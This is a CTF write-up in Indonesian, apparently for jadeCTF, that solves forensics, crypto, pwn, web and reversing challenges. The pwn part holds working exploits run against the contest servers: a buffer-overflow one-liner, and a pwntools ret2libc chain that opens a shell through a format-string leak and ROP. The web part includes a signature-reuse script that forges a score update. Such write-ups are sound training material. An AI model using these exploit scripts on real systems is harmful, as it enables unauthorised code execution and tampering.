# DFIR 
---
## lm10

Diberikan file pcapng didalam ada beberapa image dan flag.txt yang tentunya itu rickroll, di salah satu image ada flag didalam nya

![](Pasted%20image%2020221023144928.png)

di random.png

![](Pasted%20image%2020221023145014.png)

save file menggunakan menu ini

![](Pasted%20image%2020221023145032.png)

Flag : jctf{No_doubt_he's_the_best_in_the world}

## AUTOCAD

Kita diberikan png, tetapi ada sesuatu yang bermasalah dengan png itu.
Mari kita cek menggunakan pngcheck.

![](Pasted%20image%2020221023153937.png)

ternyata dimensinya bermasalah.
disini saya menemukan soal yang mirip: https://github.com/as3ng/RTLCTF/tree/main/Forensics/Manipulated
dari referensi soal tersebut saya mengcopy script untuk membruteforce dimensinya sehingga nantinya menghasilkan crc yang sama dengan di IHDR

```python
from binascii import crc32

crc_checksum = int.from_bytes(
    b'\x17\x63\xad\xc8', byteorder='big')  # ihdr crc

for h in range(0xffff):
    for w in range(0xffff):
        # IHDR Chunk + (4 Bytes Width) + (4 Bytes Height) + Bit Depth + Col Type + Compression Method + Filter Method + Interlace Method
        crc = b"\x49\x48\x44\x52" + \
            w.to_bytes(4, byteorder='big') +\
            h.to_bytes(4, byteorder='big') +\
            b"\x08\x06\x00\x00\x00"

        if crc32(crc) % (1 << 32) == crc_checksum:
            print('Image Width: ', end="")
            print(hex(w))
            print('Image Height :', end="")
            print(hex(h))
```

![](Pasted%20image%2020221023154016.png)

setelah mendapatkan dimensi height dan width yang benar saya patch png tersebut

```python
from struct import pack

file = "poster.png"

def change_size(width, height) -> bytes:
    with open(file, 'rb') as f:
        data = f.read()
        
    ihdr_ofset = data.find(b'IHDR')
    
    height = pack('>I', height)
    width = pack('>I', width)
    new_data = (height+width).join([data[:ihdr_ofset+4], data[ihdr_ofset+4+8:]])
    with open('new_'+file, 'wb') as f:
        f.write(new_data)
        
change_size(0x1c2, 0x320)
 
```

maka akan menghasilkan gambar seperti ini.
Image

![](Pasted%20image%2020221023154059.png)

setelah itu kita cari flagnya menggunakan stegsolve dengan opsi green plane 4, dan kita mendapatkan flagnya, yay.

setelah itu kita cari flagnya menggunakan stegsolve dengan opsi green plane 4, dan kita mendapatkan flagnya, yay.

![](Pasted%20image%2020221023154120.png)

## CALL SANDEEP
Didalam file challenge kita menemukan sebuah ciphertext dan juga algoritma enkripsinya

```python
# cipher text : 5b2b7f05237305611f3368214d3a601d4325740fa


def encrypt(text):
    result = ""
    cipher = []
    for i in text:
        cipher.append(ord(i))
    for i in range(len(cipher)):
        if i > 0:
            cipher[i] ^= cipher[i-1]
        cipher[i] ^= cipher[i] >> 4
        cipher[i] ^= cipher[i] >> 3
        cipher[i] ^= cipher[i] >> 2
        cipher[i] ^= cipher[i] >> 1
        result += "%02x" % (cipher[i])
    return result
```
 
disini kita bisa mendaptkan plaintext dengan cara mem-bruteforce

```python
cipher = "5b2b7f05237305611f3368214d3a601d4325740fa"
known = ""
for i in range(0, len(cipher), 2):
    for j in range(33, 126):
        br_res = encrypt(known+chr(j))
        if cipher[i:i+2] == br_res[i:i+2]:
            known += chr(j)
            break
            
print("text: "+known)
```

maka akan menghasilkan "ybbx1at_s0e_Fnaqrrc}", kita bisa mendecodenya menggunakan caesar cipher
https://media.discordapp.net/attachments/1032514726439170128/1033295608078942271/unknown.png?width=924&height=400

![](Pasted%20image%2020221023155120.png)

nah untuk flag selanjutnya kita perlu mendatapkan sebuah file png di dalam challenge.Ada Part-1.png terus tinggal ubah header hex nya yang rusak ke png yang asli

![](Pasted%20image%2020221023155211.png)

![](Pasted%20image%2020221023155218.png)

# CRYPTO
---
## HANDS
disini saya menggunakan referensi ini untuk mendecode handsign yang terdapat dalam gambar
https://create.arduino.cc/projecthub/173799/a-glove-that-translate-sign-language-into-text-and-speech-c91b13

# PWN
---
## BABY-PWN

Yang pertama kita lakukan adalah mengecek security dari binary filenya

```bash
⋊> ~/D/M/D/W/J/p/BABY-PWN on main ⨯ checksec --file=chall                             
[*] './BABY-PWN/chall'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

Ternyata filenya tidak menggunakan stack canary, sehingga kemungkinan kita bisa mendapatkan buffer overflow dengan mudah. Dan programnya juga tidak menggunakan PIE yang artinya address dari fungsi tidak akan berubah ubah.

kedua kita akan mendecompile program menggunakan ghidra

```c
void start_program(void)

{
  char local_208 [512];
  
  puts("Enter your name:");
  gets(local_208);
  printf("Hello %s, welcome to jadeCTF!\n",local_208);
  return;
}
```

saat mendecompile program menggunakan ghidra kita akan menemukan bahwa program menggunakan gets, dimana kalau kita lihat di man 3 gets https://linux.die.net/man/3/gets kita akan melihak kalau gets itu memiliki bug yang dapat membuat buffer overflow pada stack, ini bisa kita manfaatkan untuk  merubah return adress yang berada dibawah stack.

dan diketahui bahwa disini ada fungsi win yang akan mengeread flagnya (tipikal ret2win challenge)

```c
void win(void)

{
  char local_78 [104];
  FILE *local_10;
  
  puts("Nice job :)");
  local_10 = fopen("flag.txt","r");
  if (local_10 == (FILE *)0x0) {
    puts("Sorry, flag doesn\'t exist.");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  fgets(local_78,100,local_10);
  printf("Here is your flag: %s\n",local_78);
  return;
}
```

### rencana

jadi rencananya kita perlu untuk membuffer overflow stack sebesar alokasi local_208 plus 8 byte yang berada di tengah stack dan return address, nanti di return adress kita ganti dengan address dari fungsi win()

### payload

```bash
(python3 -c 'print("A"*(512+8)+"\x46\x07\x40")') | nc 34.76.206.46 10002
```

```bash
wowon:./Jade-CTF/pwn/BABY-PWN $ (python3 -c 'print("A"*(512+8)+"\x46\x07\x40")') | nc 34.76.206.46 10002
Enter your name:
Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAF@, welcome to jadeCTF!
Nice job :)
Here is your flag: jadeCTF{buff3r_0v3rfl0ws_4r3_d4ng3r0u5}
```

## LOVE CALCULATOR
pada soal kita diberikan binary chall, mari kita check menggunakan checksec

```bash
gef➤  checksec
[+] checksec for './Writeup/Jade-CTF/pwn/LOVE CALCULATOR/chall'
Canary                        : ✘ 
NX                            : ✓ 
PIE                           : ✘ 
Fortify                       : ✘ 
RelRO                         : Partial
```
 
pada binary chall, kita juga mengecek pseudocode dari program menggunakan ida64, maka akan terlihat beberapa fungsi utama yaitu
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s[32]; // [rsp+0h] [rbp-20h] BYREF

  setvbuf(_bss_start, 0LL, 2, 0LL);
  setvbuf(stdin, 0LL, 1, 0LL);
  puts("Welcome to *my* world! It sucks.");
  printf("Please enter your name: ");
  fgets(s, 19, stdin);
  putchar(10);
  s[strcspn(s, "\r\n")] = 0;
  analyze_name(s);
  puts("Bye Bye");
  return 0;
}
```

```c
int __fastcall analyze_name(const char *a1)
{
  int result; // eax
  int v2; // [rsp+1Ch] [rbp-74h] BYREF
  char v3[112]; // [rsp+20h] [rbp-70h] BYREF

  printf("Hello, %s! I heard you've come here to analyze yourself.\n", a1);
  puts("1. Cleanse yourself\n2. Calculate love percentage\n3. Exit");
  printf("Please choose what you would like to do: ");
  __isoc99_scanf("%d", &v2);
  if ( v2 == 1 )
  {
    puts("Cleansing....");
    return puts("Cleanse successful. You are fully pure now!");
  }
  else
  {
    if ( v2 != 2 )
    {
      puts("Sorry to see you go :-(");
      exit(0);
    }
    printf("Enter the name of the lucky one ;): ");
    getchar();
    gets(v3);
    if ( show_flag )
    {
      puts("Sorry, but you have already got the flag");
      exit(0);
    }
    result = tried_luck;
    if ( tried_luck )
    {
      puts("Sorry, but you can only try your luck once :)");
      exit(0);
    }
    tried_luck = 1;
  }
  return result;
}
```

ada juga fungsi yang tersembunyi pada program yaitu:

```c
__int64 you_cant_see_me()
{
  __int64 result; // rax
  char buf[208]; // [rsp+0h] [rbp-F0h] BYREF
  char s[8]; // [rsp+D0h] [rbp-20h] BYREF
  __int64 v3; // [rsp+D8h] [rbp-18h]
  int v4; // [rsp+E0h] [rbp-10h]
  unsigned int v5; // [rsp+ECh] [rbp-4h]

  *(_QWORD *)s = 0xA65686548LL;
  v3 = 0LL;
  v4 = 0;
  v5 = 0;
  printf("Did you see m%d? ", 3LL);
  printf("Wh%d are you?\n", 0LL);
  read(0, buf, 0xC8uLL);
  printf("Nice name it %ds: ", 1LL);
  printf(buf);
  printf("But now you won't be able to s%d%d me!\n", 3LL, 3LL);
  puts(s);
  result = v5;
  show_flag = v5;
  return result;
}
```

```c
int win()
{
  char s[104]; // [rsp+0h] [rbp-70h] BYREF
  FILE *stream; // [rsp+68h] [rbp-8h]

  stream = fopen("flag.txt", "r");
  if ( !stream )
  {
    printf("Sorry, fl%dg doesn't exist.\n", 4LL);
    exit(0);
  }
  fgets(s, 100, stream);
  if ( !show_flag )
  {
    printf("Sorry, no fl%dg for you!", 4LL);
    exit(0);
  }
  return printf("Here is your flag: %s\n", s);
}
```

Note: disini saya tidak menggunakan fungsi win() untuk medapatkan flagnya, jadi pada writeup kali ini kita bisa menghiraukan fungsi win() 

### To Long To Write
jadi vulnerabilitnya ada di fungsi analyze_name() pada gets(v3); (buffer overflow) dan fungsi you_cant_see_me() pada printf(buf); (format string vuln)

### rencana
Disini saya akan mendapkan RCE via formatstring dan juga ROP. Jadi rencananya adalah

#### Tahap 1 persiapan
1. pertama kita akan membuat buffer overflow di fungsi analyze_name() sehingga return address dapat kita kontrol.
2. membuat return address agar terpoint ke address fungsi you_cant_see_me(), sehingga nantinya kita bisa memanfaatkan format string vuln.
3. mendapatkan GOT dari memanfaatkan format string vuln, setelah itu mencari versi libc yang sesuai di website https://libc.nullbyte.cat/
4. setelah mendapatkan libc yang sesuai kita patch binary dari chall menggunakan pwninit

#### Tahap 2 exploitasi
1. Lakukan point 1 dan 2 pada Tahap 1
2. kali ini kita akan memanfaatkan format string 2 x, yang pertama kita akan membuat formatstring agar variable tried_luck nilainya menjadi false lagi, yang kedua untuk kita me-leak address dari libc.
3. setelah itu kita return ke fungsi main() lagi.
4. dari situ kita bisa memanfaat beffer overflow untuk ROP dan mendapatkan RCE.

script untuk tahap pertama

```python
from pwn import *
import sys

BINARY = "chall"
context.binary = exe = ELF(f"./{BINARY}", checksec=False)
context.terminal = "konsole -e".split()
context.log_level = "INFO"
context.bits = 64
context.arch = "amd64"


def init():
    if args.RMT:
        p = remote(sys.argv[1], sys.argv[2])
    else:
        p = process()
    return Exploit(p), p


class Exploit:
    def __init__(self, p: process):
        self.p = p

    def debug(self, script=None):
        if not args.RMT:
            if script:
                attach(self.p, script)
            else:
                attach(self.p)

    def enter_name(self, name):
        p = self.p
        p.sendlineafter(b"Please enter your name: ", name)

    def calculate_love(self, lucky_name):
        p = self.p
        p.sendlineafter(b"Please choose what you would like to do: ", b"2")
        p.sendlineafter(b"Enter the name of the lucky one ;): ", lucky_name)

    def you_cant_see_me(self, name):
        p = self.p
        p.sendlineafter(b"are you?", name)

    def leak(self, address) -> bytes:
        p = self.p
        self.enter_name(b"dimas")
        rp = ROP(exe)
        pay = flat(
            cyclic(120),
            rp.find_gadget(['ret'])[0],
            rp.find_gadget(['pop rdi', 'ret'])[0],
            address,
            exe.sym['puts'],
            rp.find_gadget(['pop rdi', 'ret'])[0],
            exe.sym['exit']
        )
        self.calculate_love(pay)

        return p.recvline().strip()[::-1].hex()


def leak(name):
    x, p = init()
    puts_leak = x.leak(exe.got[name])
    log.success(f"{name} @ {puts_leak}")
    p.close()
    return puts_leak


leak('puts')
leak('gets')
```

script untuk tahap kedua

```python
from pwn import *
import sys

BINARY = "chall_patched"
context.binary = exe = ELF(f"./{BINARY}", checksec=False)
libc = ELF("libc.so.6", checksec=False)
context.terminal = "konsole -e".split()
context.log_level = "INFO"
context.bits = 64
context.arch = "amd64"


def init():
    if args.RMT:
        p = remote(sys.argv[1], sys.argv[2])
    else:
        p = process()
    return Exploit(p), p


class Exploit:
    def __init__(self, p: process):
        self.p = p

    def debug(self, script=None):
        if not args.RMT:
            if script:
                attach(self.p, script)
            else:
                attach(self.p)

    def enter_name(self, name):
        p = self.p
        p.sendlineafter(b"Please enter your name: ", name)

    def calculate_love(self, lucky_name):
        p = self.p
        p.sendlineafter(b"Please choose what you would like to do: ", b"2")
        p.sendlineafter(b"Enter the name of the lucky one ;): ", lucky_name)

    def you_cant_see_me(self, name):
        p = self.p
        p.sendlineafter(b"are you?", name)

    def exploit(self):
        p = self.p
        self.enter_name(b"dimas")
        """
        disini kita return ke fungsi you_cant_see_me 2x.
        rencananya:
        return yang pertama kita akan membuat formatstring agar variable tried_luck nilainya menjadi false lagi
        return yang kedua kita me-leak address dari libc
        """
        rp = ROP(exe)
        pay = flat(
            cyclic(120),
            rp.find_gadget(['ret'])[0],
            exe.sym['you_cant_see_me'],
            exe.sym['you_cant_see_me'],
            exe.sym['main'],

        )
        self.calculate_love(pay)
                """
        kita rubah variable tried_luck agar nilainya menjadi false lagi
        """
        self.you_cant_see_me(fmtstr_payload(6, {exe.sym['tried_luck']: 0}))
        """
        lalu kita manfaatkan format string lagi agar dapat meleak address dari libc
        """
        self.you_cant_see_me(b"%2$lX")
        p.recvuntil(b"Nice name it 1s: ")
        libc_leak = eval(b"0x"+p.recvline().strip())
        libc.address = libc_leak - 0x3c6780
        log.info(f"{libc.address=:x}")


        """
        Setelah itu kita tinggal melakukan ret2libc
        """
        rp = ROP(libc)
        pay = flat(
            cyclic(120),
            rp.find_gadget(['ret'])[0],
            rp.find_gadget(['pop rdi', 'ret'])[0],
            next(libc.search(b'/bin/sh')),
            libc.sym['system']
        )
        self.enter_name(b"dimas")
        self.calculate_love(pay)
        p.interactive()


if __name__ == "__main__":
    x, p = init()
    x.debug('break *analyze_name\nc\nc')
    x.exploit()
```

and boom, we got the flag

![](Pasted%20image%2020221023154451.png)

# web
---
## Ultra Baby Web

disini kita hanya perlu membuat flag user = admin

![](Pasted%20image%2020221023154508.png)

## BABY WEB
setelah menganalisis respon yang diberikan, ternyata ada beberapa request yang akan memberikan string yang sama meskipun kita request beberapa kali. Dan ternyata angka angka itu adalah angka fibonacci, misal [1, 2,3,5,8,13]
solve:

```python
import requests

URL = "http://34.76.206.46:10008"

def get_nth_fibonacci_number(n):
    current_numb = 1
    previous_numb = 1
    sequence = []
    for i in range(n+1):
        current_numb = current_numb + previous_numb
        previous_numb = current_numb - previous_numb
        sequence.append(current_numb)
    return sequence

def get(num, url=URL):
    req = requests.get(f"{url}/?page={1}")
    print(req.text)
    for i in get_nth_fibonacci_number(num):
        req = requests.get(f"{url}/?page={i}")
        print(req.text)
        
get(100)
```

untuk fibonaci saya menggeneratenya menggunakan bantuan ai

![](Pasted%20image%2020221023154544.png)
[https://beta.character.ai/chat](https://beta.character.ai/chat "https://beta.character.ai/chat")

## ++game
Diketahui web ini akan memberikan kita flag, ketika kita bisa membuat score kita menjadi 9223372036854775807.

Kita juga diberikan source code. Didalam source code yang diberikan ada baris kode program yang menarik pada server/src/index.php
```php
...snip...
 if(isset($_POST["username"]) && isset($_POST["password"])){
        $username=$_POST["username"];
        $password=$_POST["password"];
        $concat=$username.$password.$secret; <- ter concat 
        $signature=sha1($concat);
        $var="http://api/register.php?username={$username}&password={$password}&signature={$signature}";
        $head=sprintf("API: %s",$var); <- dimasukkan ke header
        header($head);
...snip...
```
 
dan di api/src/update_score.php
```php
..snip...
        $username=$_GET["username"];
        $next_level=$_GET["next_level"];
        $signature=$_GET["signature"];

        $concatenated=$username.$next_level.$secret; <-ter concat juga
        $computed=sha1($concatenated);
        if($signature===$computed){
            echo "success";
            $database[$username]['score']=$next_level; <- mengubah skor
            file_put_contents('/var/www/db/database.bin', serialize($database));
            http_response_code(200);
        }
...snip...
```

concat yang pertama bisa kita gunakan untuk menggenerate sha1 semau kita dengan ketentuan $username.$password.$secret dimana $username dan $password dapat kita kontrol. 
sedangkan yang kedua bisa membuat skor kita menjadi banyak, tetapi kita perlu membypas MAC nya dulu.

### Rencana
1. kita akan menggenerate sha1 di endpoint concat pertama http://103.20.235.21:8000/index.php
```php
input kita:
$username=""
$password="9223372036854775807"
process dalam program:
$username.$password.$secret
akan menghasilkan string:
"9223372036854775807<<SECRET>>"
kita ambil sha1 dari string diatas yang dapat kita temukan di header
```
2. setelah itu sha1 yang sudah kita dapatkan, kita masukkan ke  http://103.20.235.21:9000/update_score.php untuk mengubah flag menjadi nilai 9223372036854775807
```php
input kita:
$username=""
$next_level="9223372036854775807"
$signature=sha1 yang tadi kita dapatkan
process dalam program:
$username.$next_level.$secret
akan menghasilkan string:
"9223372036854775807<<SECRET>>"
```
### eksploitasi
```python
import requests
from urllib.parse import quote

# URL = "http://localhost"

URL = "http://103.20.235.21"
PHPSESSID = "64844fb4de221741370fb1e3bf92f36a"


class API(object):
    def update_score(username, next_level, signature, url=URL):
        username = quote(username)
        next_level = quote(next_level)
        signature = quote(signature)
        res = requests.get(
            f"{url}:9000/update_score.php?username={username}&next_level={next_level}&signature={signature}")
        return res.status_code

class SERVER(object):
    def login(username, password, url=URL):
        res = requests.post(f"{url}:8000/index.php", data={
            "username": username,
            "password": password
        },cookies={"PHPSESSID": PHPSESSID})
        return res.headers

sha1 = SERVER.login('','9223372036854775807')['API'].split('=')[-1]
res = API.update_score("", "9223372036854775807", sha1)

print(res)
```

![](Pasted%20image%2020221023154928.png)

dan yay kita mendapatkan flagnya

![](Pasted%20image%2020221023154942.png)



# rev
---
## DENJI EX-MAKIMA

Kita diberikan file berupa dot exe.
Disini saya mendecompile binary tersebut menggunakan ekstensi ILSPY di VSCode.
Saya menemukan fungsi untuk mendecrypt file.fun

```c#
        private static void DecryptFile(string path, string encryptionExtension)
        {
            try
            {
                if (!path.EndsWith(encryptionExtension))
                {
                    return;
                }
                string outputFile = path.Remove(path.Length - 4);
                using AesCryptoServiceProvider aesCryptoServiceProvider = new AesCryptoServiceProvider();
                aesCryptoServiceProvider.Key = Convert.FromBase64String("OoIsAwwF32cICQoLDA0ODe==");
                aesCryptoServiceProvider.IV = new byte[16]
                {
                    0, 1, 0, 3, 5, 3, 0, 1, 0, 0,
                    2, 0, 6, 7, 6, 0
                };
                DecryptFile(aesCryptoServiceProvider, path, outputFile);
            }
            catch
            {
                return;
            }
            try
            {
                File.Delete(path);
            }
            catch (Exception)
            {
            }
        }
```
 
langsung saja saya translate logic dari program tersebut menggunakan bahasa python
```python
from Crypto.Cipher import AES
from pkcs7 import PKCS7Encoder
import base64

shared_key =  base64.b64decode("OoIsAwwF32cICQoLDA0ODe==")#some random key for a working example
iv = [0, 1, 0, 3, 5, 3, 0, 1, 0, 0, 2, 0, 6, 7, 6, 0]
iv = [chr(i) for i in iv]
iv = b''.join(iv)

cipher_text = open('file.fun', 'rb').read() 

aes_decrypter = AES.new(shared_key, AES.MODE_CBC, iv)
aes_decrypter.block_size = 128
clear_text = PKCS7Encoder().decode(aes_decrypter.decrypt(cipher_text))
print(clear_text)
```
dan yay, kita mendapatkan flagnya

![](Pasted%20image%2020221023154728.png)

